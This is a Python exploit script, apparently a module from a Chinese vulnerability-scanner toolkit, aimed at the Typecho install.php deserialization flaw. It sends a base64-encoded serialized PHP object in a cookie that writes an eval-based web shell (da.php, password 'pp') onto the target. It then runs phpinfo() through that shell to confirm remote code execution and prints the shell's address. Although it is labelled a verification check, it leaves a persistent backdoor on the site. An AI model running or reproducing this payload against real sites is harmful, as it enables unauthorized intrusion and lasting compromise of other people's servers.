#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: typecho install.php反序列化命令执行
referer: http://p0sec.net/index.php/archives/114/
author: Lucifer
description: 漏洞产生在install.php中，base64后的值被反序列化和实例化后发生命令执行。
'''
import sys
import requests
import warnings
from termcolor import cprint

class typecho_install_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Cookie":"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTY6ImZpbGVfcHV0X2NvbnRlbnRzKCdkYS5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbcHBdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9",
            "Referer":self.url + "/install.php",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
        }
        vulnurl = self.url + "/install.php?finish=1"
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            shellpath = self.url + "/da.php"
            post_data ={
                "pp":"phpinfo();"
            }
            req1 = requests.post(self.url + "/da.php", data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req1.text:
                cprint("[+]存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tshell地址: "+shellpath+"\t密码: pp", "red")
                return True, vulnurl, "typecho install.php反序列化命令执行", vulnurl, req.text
            else:
                cprint("[-]不存在typecho_install_code_exec漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = typecho_install_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()